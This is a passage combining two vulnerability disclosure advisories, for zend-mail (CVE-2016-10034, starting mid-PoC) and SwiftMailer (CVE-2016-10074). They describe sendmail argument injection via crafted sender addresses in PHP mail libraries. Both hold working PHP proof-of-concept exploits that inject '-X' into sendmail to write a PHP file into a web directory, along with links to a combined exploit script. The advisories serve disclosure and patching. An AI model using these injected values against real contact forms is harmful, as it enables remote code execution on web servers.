Arg no. 7 == ["@email.com]

which will write the transfer log (-X) into /var/www/cache/phpcode.php file.
Note /var/www/cache must be writable by www-data web user.

The resulting file will contain the payload passed in the body of the msg:

09607 <<< Content-Type: text/html; charset=us-ascii
09607 <<<
09607 <<< <?php phpinfo(); ?>
09607 <<<
09607 <<<
09607 <<<

See the full advisory URL for the exploit details.

*/

// Attacker's input coming from untrusted source such as $_GET , $_POST etc.
// For example from a Contact form with sender/body fields

$email_from = '"attacker\" -oQ/tmp/ -X/var/www/cache/phpcode.php "@email.com';
// encoded phpinfo() php code
$msg_body = base64_decode("PD9waHAgcGhwaW5mbygpOyA/Pg==");

// ------------------

// mail() param injection via the vulnerability in zend-mail

chdir(dirname(__DIR__));
include 'vendor/Zend/Loader/AutoloaderFactory.php';

Zend\Loader\AutoloaderFactory::factory(array(
        'Zend\Loader\StandardAutoloader' => array(
                'autoregister_zf' => true
        )
));

Zend\Mvc\Application::init(require 'config/application.php')->run();

$message        = new \Zend\Mail\Message();

$message->setBody($msg_body);
$message->setFrom($email_from, 'Attacker');
$message->addTo('support@localhost', 'Support');
$message->setSubject('Zend PoC');

$transport  = new \Zend\Mail\Transport\Sendmail();
$transport->send($message);

~~~~~~~~~~~

More advanced exploit targetting a contact form can be found at:

<https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>

Video PoC:
~~~~~~~~~~~~~

<https://legalhackers.com/videos/ZendFramework-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10034-PoC.html>

VI. BUSINESS IMPACT
-------------------------

A successful exploitation could let remote attackers to gain access to
the target server in the context of the web server account which could
lead to a full compromise of the web application.

VII. SYSTEMS AFFECTED
-------------------------

The patch resolving the vulnerability is available in:

zend-mail, starting in version 2.7.2
zend-mail, 2.4.11
Zend Framework, 2.4.11

VIII. SOLUTION / VENDOR RESPONSE
-------------------------

Update to the latest versions that contain the patch.

<https://framework.zend.com/security/advisory/ZF2016-04>

IX. REFERENCES
-------------------------

<https://legalhackers.com>

This / CVE-2016-10034 advisory URL:
<https://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html>

Video PoC exploit:
<https://legalhackers.com/videos/ZendFramework-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10034-PoC.html>
<https://www.youtube.com/watch?v=xyYMYvT2bx8>

Exploit code:
The simple PoC shown above is available here:
<https://legalhackers.com/exploits/CVE-2016-10034/zend-mail_PoC_RCE_Exploit.txt>

Combined exploit code for multiple targets:

<https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>

Other exploits with other attack vectors will be disclosed at a later date to
allow more time for patching.

The previously undisclosed techniques and exploitation vectors will be described in a security
white-paper at:
<https://legalhackers.com/papers/Pwning-PHP-mail-func-For-Fun-And-RCE-New-Exploit-Techniques-Vectors.html>

CVE-2016-10034
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10034>

Vendor site:
<https://framework.zend.com>

Related vulnerabilities (found in PHPMailer & SwiftMailer):

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html>
<https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html>

X. CREDITS
-------------------------

The vulnerability has been discovered by Dawid Golunski
dawid (at) legalhackers (dot) com

<https://legalhackers.com>

Thanks to Beyond Security for help with the disclosure

XI. REVISION HISTORY
-------------------------

30.12.2016 - Limited advisory released

XII. LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this information.

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Check out the new project of the same author:
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)
[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

```


=== Content from legalhackers.com_c8ce843e_20250126_083820.html ===

```

[__                     __   __  __           __
   / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
  / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
 / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
/_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/](https://legalhackers.com)

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Interested in security / vulns / exploits ?
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)

[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

=============================================
- Discovered by: Dawid Golunski
- dawid[at]legalhackers.com
- <https://legalhackers.com>

- CVE-2016-10074
- Release date:  30.12.2016
- Last revision: 29.12.2016
- Revision 3.0
- Severity: Critical
=============================================

I. VULNERABILITY
-------------------------

SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)

II. BACKGROUND
-------------------------

"Swift Mailer is a component-based library for sending e-mails from PHP applications."

"Swift Mailer began back in 2005 as a one-class project for sending mail over SMTP.
It has since grown into the flexible component-based library that is in development today."

SwiftMailer library is used by major PHP projects including some of the
most popular PHP programming frameworks such as Yii2, Laravel, Symfony.

<https://github.com/swiftmailer/swiftmailer/blob/5.x/doc/introduction.rst>
<https://github.com/swiftmailer/swiftmailer/blob/5.x/doc/overview.rst>

Symfony / Yii / Laravel frameworks:

<http://symfony.com/doc/current/email.html>

<https://github.com/yiisoft/yii2-swiftmailer>

<https://laravel.com/docs/5.1/mail>

III. INTRODUCTION
-------------------------

An independent research uncovered a critical vulnerability in SwiftMailer that
could potentially be used by (unauthenticated) remote attackers to achieve
remote arbitrary code execution in the context of the web server user and
remotely compromise the target web application.

To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the SwiftMailer class.

Update (29.12): Vendor has released the patch in version 5.4.5.

Note: This advisory is limited.
Remaining attack vectors/exploits will be disclosed at a later date to allow
more time for patching.

IV. DESCRIPTION
-------------------------

SwiftMailer class uses PHP mail() function as its default transport.

SwiftMailer suffers from the same vulnerability as the one disclosed in
PHPMailer in the advisory at:

<http://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

The following Sender address:

"Attacker -Param2 -Param3"@test.com

would cause SwiftMailer/mail() function to execute /usr/bin/sendmail with the
following list of arguments:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker -Param2 -Param3@test.com]

which would not work for the attacker (Param2 and Param3 are passed within
the same argument of argv[3] )

Attackers can however break out of parameter no.3 with some extra escaping.

For example, by injecting an extra sequence of \" after the first argument,
the following Sender email:

"Attacker \" -Param2 -Param3"@test.com

when passed to SwiftMailer (and eventually to mail()) function would cause
sendmail to execute with:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com]

Which as can be seen would inject additional parameters of 4 & 5 to sendmail.

Attackers can exploit this to achieve code execution as shown in the PoC
below.

V. PROOF OF CONCEPT EXPLOIT
-------------------------

<?php

/*

SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)

Discovered/Coded by:

Dawid Golunski
<https://legalhackers.com>

Full Advisory URL:
<https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html>

Video PoC
<https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>

Follow the feed for updates:

<https://twitter.com/dawid_golunski>

A simple PoC (working on Sendmail MTA)

It will inject the following parameters to sendmail command:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fattacker\]
Arg no. 4 == [-oQ/tmp/]
Arg no. 5 == [-X/var/www/cache/phpcode.php]
Arg no. 6 == ["@email.com]

which will write the transfer log (-X) into /var/www/cache/phpcode.php file.
Note /var/www/cache must be writable by www-data web user.

The resulting file will contain the payload passed in the body of the msg:

09607 <<< Content-Type: text/html; charset=us-ascii
09607 <<<
09607 <<< <?php phpinfo(); ?>
09607 <<<
09607 <<<
09607 <<<

See the full advisory URL for the exploit details.

*/

// Attacker's input coming from untrusted source such as $_GET , $_POST etc.
// For example from a Contact form with sender/body fields

$email_from = '"attacker\" -oQ/tmp/ -X/var/www/cache/phpcode.php "@email.com';
$msg_body = '<?php phpinfo(); ?>';

// ------------------

// mail() param injection via the vulnerability in SwiftMailer

require_once 'lib/swift_required.php';
// Mail transport
$transport = Swift_MailTransport::newInstance();
// Create the Mailer using your created Transport
$mailer = Swift_Mailer::newInstance($transport);

// Create a message
$message = Swift_Message::newInstance('Swift PoC exploit')
  ->setFrom(array($email_from => 'PoC Exploit Payload'))
  ->setTo(array('receiver@domain.org', 'other@domain.org' => 'A name'))
  ->setBody($msg_body);
// Send the message with PoC payload in 'from' field
$result = $mailer->send($message);

~~~~~~~~~~~

More advanced exploit targetting a contact form can be found at:

<https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>

Video PoC:
~~~~~~~~~~~~~

<https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>

VI. BUSINESS IMPACT
-------------------------

A successful exploitation could let remote attackers to gain access to
the target server in the context of the web server account which could
lead to a full compromise of the web application.

VII. SYSTEMS AFFECTED
-------------------------

All versions of SwiftMailer including the latest of 5.4.5-DEV are affected.

Update (29.12): Vendor has released the patch in version 5.4.5.

VIII. SOLUTION / VENDOR RESPONSE
-------------------------

The vulnerability was responsibly disclosed to SwiftMailer vendor.
The first contact attempts started on the 2nd of December.
Unfortunatelly the vendor has not fixed the SwiftMailer library to date and
the library remains vulnerable in its latest version (5.4.5-dev).
Because of this, users of SwiftMailer (which includes various frameworks that make
use of the library) remain at risk.

The vendor was advised by the researcher of the upcoming exploit for another
library (PHPMailer) which when published by the vendor/researcher, would make
it possible for malicious users to "connect the dots" and use the same vectors/payloads
to attack SwiftMailer users as they are almost identical.

The last attempt of contact (resending the tested PoC exploit) was made on Dec 26th
to which the vendor have not replied and little action seems to have been taken.

As after the publication of PHPMailer exploit and patches other users on the Internet
did start to see the similarities and file public vulnerability reports, there is no
more point in keeping this advisory private. Keeping it private would only give
more advantage to potential attackers.

CVE MITRE assigned the following ID to this vulnerability:

CVE-2016-10074

Update (29.12): Vendor has released the patch in version 5.4.5.

IX. REFERENCES
-------------------------

<https://legalhackers.com>

This (CVE-2016-10074) advisory:
<https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html>

Video PoC:
<https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>
<https://www.youtube.com/watch?v=xyYMYvT2bx8>

Exploit code:
Simple PoC shown above is available here:
<https://legalhackers.com/exploits/CVE-2016-10074/SwiftMailer_PoC_RCE_Exploit.txt>

Combined exploit code for multiple targets:
<https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>

Other exploits with other attack vectors will be disclosed at a later date to
allow more time for patching.

The previously undisclosed techniques and exploitation vectors will be described in a security
white-paper at:
<https://legalhackers.com/papers/Pwning-PHP-mail-func-For-Fun-And-RCE-New-Exploit-Techniques-Vectors.html>

CVE-2016-10074
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10074>

SwiftMailer github

<https://github.com/swiftmailer/swiftmailer>

X. CREDITS
-------------------------

The vulnerability has been discovered by Dawid Golunski
dawid (at) legalhackers (dot) com

<https://legalhackers.com>

Thanks to SecuriTeam for help with the disclosure.

XI. REVISION HISTORY
-------------------------

30.12.2016 - Updated exploit code

29.12.2016 - Update regarding the patch

28.12.2016 - Limited advisory released

XII. LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this information.

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Check out the new project of the same author:
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)
[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

```

